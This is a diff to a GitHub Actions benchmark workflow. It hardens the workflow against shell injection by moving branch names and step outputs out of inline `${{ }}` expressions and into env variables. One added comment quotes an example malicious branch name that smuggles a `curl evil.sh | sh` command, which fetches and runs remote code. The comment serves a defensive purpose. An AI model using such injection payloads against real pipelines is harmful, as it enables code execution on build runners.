@@ -65,15 +65,23 @@ jobs:
       # this step reads, so a branch writing there would corrupt both.
       - name: Resolve ref and detect change
         id: detect
+        # Nothing from `github.*` is interpolated into the script below. A branch
+        # name is attacker-controllable and `${{ }}` is substituted *before* the
+        # shell parses the line, so `${{ github.ref_name }}` inline would let a
+        # branch called `x"; curl evil.sh | sh; #` run on the runner. The built-in
+        # `GITHUB_REF*` variables and this `env:` block are read by the shell as
+        # data instead.
+        env:
+          FORCE: ${{ github.event.inputs.force }}
         run: |
           SHORT=$(git rev-parse --short HEAD)
-          REF="${{ github.ref_name }}"
+          REF="$GITHUB_REF_NAME"
           echo "short=$SHORT" >> "$GITHUB_OUTPUT"
           echo "ref=$REF" >> "$GITHUB_OUTPUT"
           # Artifact names reject "/", which branch names routinely contain.
           echo "slug=${REF//\//-}" >> "$GITHUB_OUTPUT"
 
-          if [ "${{ github.ref }}" != "refs/heads/main" ]; then
+          if [ "$GITHUB_REF" != "refs/heads/main" ]; then
             echo "publish=false" >> "$GITHUB_OUTPUT"
             echo "run=true" >> "$GITHUB_OUTPUT"
             {
@@ -88,7 +96,7 @@ jobs:
           NUM=$(gh issue list --state open --limit 100 --json number,title \
                 --jq "map(select(.title==\"$TRACKING_TITLE\"))|.[0].number // empty")
           echo "issue=$NUM" >> "$GITHUB_OUTPUT"
-          if [ "${{ github.event.inputs.force }}" != "true" ] && [ -n "$NUM" ] \
+          if [ "$FORCE" != "true" ] && [ -n "$NUM" ] \
              && gh issue view "$NUM" --json comments \
                   --jq '.comments[].body' | grep -qF "main @ \`$SHORT\`"; then
             echo "run=false" >> "$GITHUB_OUTPUT"
@@ -122,9 +130,14 @@ jobs:
 
       - name: Build report
         if: steps.detect.outputs.run == 'true'
+        # `REF` reaches here as data for the same reason as above: it is a branch
+        # name, and this line is shell.
+        env:
+          REF: ${{ steps.detect.outputs.ref }}
+          SHORT: ${{ steps.detect.outputs.short }}
         run: |
           {
-            echo "# Benchmark run — ${{ steps.detect.outputs.ref }} @ \`${{ steps.detect.outputs.short }}\`"
+            echo "# Benchmark run — $REF @ \`$SHORT\`"
             echo
             echo "> Runner: GitHub-hosted \`ubuntu-latest\` — shared and unpinned."
             echo "> **Not a quotable baseline**; read as a trend / regression signal only."
@@ -155,8 +168,10 @@ jobs:
       # (1) greps for.
       - name: Post results to the tracking issue
         if: steps.detect.outputs.run == 'true' && steps.detect.outputs.publish == 'true'
+        env:
+          NUM_IN: ${{ steps.detect.outputs.issue }}
         run: |
-          NUM="${{ steps.detect.outputs.issue }}"
+          NUM="$NUM_IN"
           if [ -z "$NUM" ]; then
             URL=$(gh issue create --title "$TRACKING_TITLE" --body \
               "Automated benchmark trend — one comment per run of the in-process micro suite on a GitHub-hosted runner (shared, unpinned: a trend signal, **not** a quotable baseline).")
